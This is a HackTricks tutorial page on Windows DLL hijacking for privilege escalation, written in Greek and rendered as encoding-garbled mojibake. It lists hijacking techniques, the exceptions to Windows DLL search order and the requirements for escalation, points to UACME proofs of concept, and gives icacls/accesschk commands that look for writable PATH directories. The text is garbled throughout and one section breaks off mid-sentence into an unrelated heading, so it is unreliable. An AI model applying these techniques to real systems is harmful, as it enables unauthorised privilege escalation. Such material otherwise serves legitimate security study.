# Dll Hijacking

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Î•Î¬Î½ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎµÏƒÏ„Îµ Î³Î¹Î± Î¼Î¹Î± **ÎºÎ±ÏÎ¹Î­ÏÎ± ÏƒÏ„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº** ÎºÎ±Î¹ Î½Î± Ï‡Î±ÎºÎµÏÎµÏ„Îµ Ï„Î¿ Î±Ï‡Î±ÎºÎ­Î²Î±Ï„Î¿ - **Ï€ÏÎ¿ÏƒÎ»Î±Î¼Î²Î¬Î½Î¿Ï…Î¼Îµ!** (_Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î¬Ï€Ï„Î±Î¹ÏƒÏ„Î· Î³ÏÎ±Ï€Ï„Î® ÎºÎ±Î¹ Ï€ÏÎ¿Ï†Î¿ÏÎ¹ÎºÎ® Î³Î½ÏÏƒÎ· Ï„Î·Ï‚ Ï€Î¿Î»Ï‰Î½Î¹ÎºÎ®Ï‚_).

{% embed url="https://www.stmcyber.com/careers" %}

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

Î— DLL Hijacking Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ Ï€Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· Î¼Î¹Î±Ï‚ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ ÏÏƒÏ„Îµ Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Î¼Î¹Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· DLL. Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÏŒÏÎ¿Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î±ÏÎºÎµÏ„Î­Ï‚ Ï„Î±ÎºÏ„Î¹ÎºÎ­Ï‚ ÏŒÏ€Ï‰Ï‚ **DLL Spoofing, Injection ÎºÎ±Î¹ Side-Loading**. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎºÏ…ÏÎ¯Ï‰Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ±, Ï„Î·Î½ ÎµÏ€Î¯Ï„ÎµÏ…Î¾Î· Î¼ÏŒÎ½Î¹Î¼Î·Ï‚ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î±Ï‚ ÎºÎ±Î¹, ÏƒÏ€Î±Î½Î¹ÏŒÏ„ÎµÏÎ±, Ï„Î·Î½ Î±Î½Î­Î»Î¹Î¾Î· Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½. Î Î±ÏÎ¬ Ï„Î·Î½ Î­Î¼Ï†Î±ÏƒÎ· ÏƒÏ„Î·Î½ Î±Î½Î­Î»Î¹Î¾Î· ÎµÎ´Ï, Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï„Î·Ï‚ Ï€Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ·Ï‚ Ï€Î±ÏÎ±Î¼Î­Î½ÎµÎ¹ ÏƒÏ…Î½ÎµÏ€Î®Ï‚ Î±Î½ÎµÎ¾Î¬ÏÏ„Î·Ï„Î± Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ ÏƒÏ„ÏŒÏ‡Î¿Ï…Ï‚.

### ÎšÎ¿Î¹Î½Î­Ï‚ Î¤ÎµÏ‡Î½Î¹ÎºÎ­Ï‚

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î±ÏÎºÎµÏ„Î­Ï‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· DLL, Î¼Îµ Ï„Î·Î½ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÏŒÏ„Î·Ï„Î¬ Ï„Î¿Ï…Ï‚ Î½Î± ÎµÎ¾Î±ÏÏ„Î¬Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î· ÏƒÏ„ÏÎ±Ï„Î·Î³Î¹ÎºÎ® Ï†ÏŒÏÏ„Ï‰ÏƒÎ·Ï‚ DLL Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚:

1. **Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· DLL**: Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î¼Î¹Î±Ï‚ Î³Î½Î®ÏƒÎ¹Î±Ï‚ DLL Î¼Îµ Î¼Î¹Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·, Ï€ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ DLL Proxying Î³Î¹Î± Î½Î± Î´Î¹Î±Ï„Î·ÏÎ·Î¸ÎµÎ¯ Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± Ï„Î·Ï‚ Î±ÏÏ‡Î¹ÎºÎ®Ï‚ DLL.
2. **Î Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· Î¤Î¬Î¾Î·Ï‚ Î‘Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ DLL**: Î¤Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Ï„Î·Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·Ï‚ DLL ÏƒÎµ Î­Î½Î± Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹ Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î· Î³Î½Î®ÏƒÎ¹Î±, ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î· Ï„Î¿ Î¼Î¿Ï„Î¯Î²Î¿ Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚.
3. **Î Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· Î¦Î±Î½Ï„Î±ÏƒÏ„Î¹ÎºÎ®Ï‚ DLL**: Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î¼Î¹Î±Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·Ï‚ DLL Î³Î¹Î± Î½Î± Ï†Î¿ÏÏ„Ï‰Î¸ÎµÎ¯ Î±Ï€ÏŒ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î®, Ï€Î¹ÏƒÏ„ÎµÏÎ¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î¼Î· Ï…Ï€Î±ÏÎºÏ„Î® Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î· DLL.
4. **Î‘Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ· DLL**: Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ ÏŒÏ€Ï‰Ï‚ `%PATH%` Î® Î±ÏÏ‡ÎµÎ¯Î± `.exe.manifest` / `.exe.local` Î³Î¹Î± Î½Î± ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÎµÎ¹ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÏƒÏ„Î·Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· DLL.
5. **Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· DLL WinSxS**: Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î·Ï‚ Î³Î½Î®ÏƒÎ¹Î±Ï‚ DLL Î¼Îµ Î¼Î¹Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ WinSxS, Î¼Î¹Î± Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÏƒÏ…Ï‡Î½Î¬ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î· Î¼Îµ Ï„Î·Î½ Ï€Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· Ï€Î»ÎµÏ…ÏÎ¹ÎºÎ®Ï‚ Ï†ÏŒÏÏ„Ï‰ÏƒÎ·Ï‚ DLL.
6. **Î Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· DLL Î¼Îµ Î£Ï‡ÎµÏ„Î¹ÎºÎ® Î”Î¹Î±Î´ÏÎ¿Î¼Î®**: Î¤Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Ï„Î·Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·Ï‚ DLL ÏƒÎµ Î­Î½Î±Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Ï„Î·Î½ Î±Î½Ï„Î¹Î³ÏÎ±Î¼Î¼Î­Î½Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î®, Î¼Î¿Î¹Î¬Î¶Î¿Î½Ï„Î±Ï‚ Î¼Îµ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î•ÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ Î”Ï…Î±Î´Î¹ÎºÎ¿Ï Î ÏÎ¿Î¾ÎµÎ½Î¿Ï.

## Î•ÏÏÎµÏƒÎ· Î»ÎµÎ¯Ï€Î¿Ï…ÏƒÏ‰Î½ DLLs

ÎŸ Ï€Î¹Î¿ ÎºÎ¿Î¹Î½ÏŒÏ‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î»ÎµÎ¯Ï€Î¿Ï…ÏƒÎµÏ‚ DLLs Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½
#### Î•Î¾Î±Î¹ÏÎ­ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î·Î½ Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ· Ï„Î·Ï‚ Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ DLL ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î± Î­Î³Î³ÏÎ±Ï†Î± Ï„Ï‰Î½ Windows

ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÎ¾Î±Î¹ÏÎ­ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î·Î½ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ· Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ DLL Î±Î½Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î± Î­Î³Î³ÏÎ±Ï†Î± Ï„Ï‰Î½ Windows:

- ÎŒÏ„Î±Î½ ÏƒÏ…Î½Î±Î½Ï„Î¬Ï„Î±Î¹ Î­Î½Î± **DLL Ï€Î¿Ï… Î¼Î¿Î¹ÏÎ¬Î¶ÎµÏ„Î±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î¬ Ï„Î¿Ï… Î¼Îµ Î­Î½Î± Î®Î´Î· Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½Î¿ ÏƒÏ„Î· Î¼Î½Î®Î¼Î·**, Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï„Î·Î½ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·. Î‘Î½Ï„' Î±Ï…Ï„Î¿Ï, Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î±Î½ Î­Î»ÎµÎ³Ï‡Î¿ Î³Î¹Î± Î±Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎºÎ±Î¹ Î­Î½Î±Î½ Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¹ÏƒÎ¼ÏŒ Ï€ÏÎ¹Î½ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î­Î¾ÎµÎ¹ Ï„Î¿ DLL Ï€Î¿Ï… Î®Î´Î· Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î· Î¼Î½Î®Î¼Î·. **Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î´ÎµÎ½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯ Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· Î³Î¹Î± Ï„Î¿ DLL**.
- Î£Îµ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ ÏŒÏ€Î¿Ï… Ï„Î¿ DLL Î±Î½Î±Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï‰Ï‚ Î­Î½Î± **Î³Î½Ï‰ÏƒÏ„ÏŒ DLL** Î³Î¹Î± Ï„Î·Î½ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ± Î­ÎºÎ´Î¿ÏƒÎ· Ï„Ï‰Î½ Windows, Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î· Î´Î¹ÎºÎ® Ï„Î¿Ï… Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… Î³Î½Ï‰ÏƒÏ„Î¿Ï DLL, Î¼Î±Î¶Î¯ Î¼Îµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎ¾Î±ÏÏ„ÏÎ¼ÎµÎ½Î± DLL Ï„Î¿Ï…, **Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚**. Î¤Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï„Î¿Ï… Î¼Î·Ï„ÏÏÎ¿Ï… **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Î±Ï€ÏŒ Î±Ï…Ï„Î¬ Ï„Î± Î³Î½Ï‰ÏƒÏ„Î¬ DLL.
- Î‘Î½ Î­Î½Î± DLL Î­Ï‡ÎµÎ¹ ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚, Î· Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· Î³Î¹Î± Î±Ï…Ï„Î¬ Ï„Î± ÎµÎ¾Î±ÏÏ„ÏÎ¼ÎµÎ½Î± DLL Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï‰Ï‚ Î½Î± Î®Ï„Î±Î½ Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½Ï…ÏŒÎ¼ÎµÎ½Î± Î¼ÏŒÎ½Î¿ Î±Ï€ÏŒ Ï„Î± **Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï„Ï‰Î½ ÎµÎ½Î¿Ï„Î®Ï„Ï‰Î½** Ï„Î¿Ï…Ï‚, Î±Î½ÎµÎ¾Î¬ÏÏ„Î·Ï„Î± Î±Ï€ÏŒ Ï„Î¿ Î±Î½ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ DLL ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÏ„Î·ÎºÎµ Î¼Î­ÏƒÏ‰ Ï€Î»Î®ÏÎ¿Ï…Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚.

### Î‘Î½ÏÏˆÏ‰ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½

**Î‘Ï€Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚**:

- Î•Î½Ï„Î¿Ï€Î¯ÏƒÏ„Îµ Î­Î½Î± Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î± Ï€Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î® Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Îµ **Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±** (Î¿ÏÎ¹Î¶ÏŒÎ½Ï„Î¹Î± Î® Ï€Î»ÎµÏ…ÏÎ¹ÎºÎ® Î¼ÎµÏ„Î±ÎºÎ¯Î½Î·ÏƒÎ·), Î· Î¿Ï€Î¿Î¯Î± **Î»ÎµÎ¯Ï€ÎµÎ¹ Î±Ï€ÏŒ Î­Î½Î± DLL**.
- Î’ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ **Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚** Î³Î¹Î± Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ **ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿** ÏƒÏ„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Î³Î¯Î½ÎµÎ¹ **Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· Î³Î¹Î± Ï„Î¿ DLL**. Î‘Ï…Ï„Î® Î· Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ Ï„Î¿Ï… ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î® Î­Î½Î±Ï‚ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î·Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚.

ÎÎ±Î¹, Î¿Î¹ Ï€ÏÎ¿Ï‹Ï€Î¿Î¸Î­ÏƒÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ Î´ÏÏƒÎºÎ¿Î»Î¿ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÎºÎ±Î¸ÏÏ‚ **Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ Ï€ÎµÏÎ¯ÎµÏÎ³Î¿ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ Î­Î½Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿ Ï€Î¿Ï… Î»ÎµÎ¯Ï€ÎµÎ¹ Î­Î½Î± DLL** ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î± **Ï€Î¹Î¿ Ï€ÎµÏÎ¯ÎµÏÎ³Î¿ Î½Î± Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÎµ Î­Î½Î±Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ Ï„Î·Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚** (Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®). Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏƒÎµ Î¼Î· ÏƒÏ‰ÏƒÏ„Î¬ Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î± Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ.\
Î£Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Î­Ï‡ÎµÏ„Îµ Ï„Î·Î½ Ï„ÏÏ‡Î· ÎºÎ±Î¹ Ï€Î»Î·ÏÎ¿Î¯Ï„Îµ Ï„Î¹Ï‚ Î±Ï€Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ Î­ÏÎ³Î¿ [UACME](https://github.com/hfiref0x/UACME). Î‘ÎºÏŒÎ¼Î± ÎºÎ¹ Î±Î½ Ï„Î¿ **ÎºÏÏÎ¹Î¿ ÏƒÏ„ÏŒÏ‡Î¿ Ï„Î¿Ï… Î­ÏÎ³Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î· Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï„Î¿Ï… UAC**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎµÎºÎµÎ¯ Î­Î½Î± **PoC** Î³Î¹Î± Ï„Î·Î½ ÎºÎ»Î¿Ï€Î® DLL Î³Î¹Î± Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Ï‰Î½ Windows Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ (Ï€Î¹Î¸Î±Î½ÏÏ‚ Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… ÏŒÏ€Î¿Ï… Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚).

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î¬ ÏƒÎ±Ï‚ ÏƒÎµ Î­Î½Î±Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿** ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
ÎšÎ±Î¹ **ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Ï†Î±ÎºÎ­Î»Ï‰Î½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
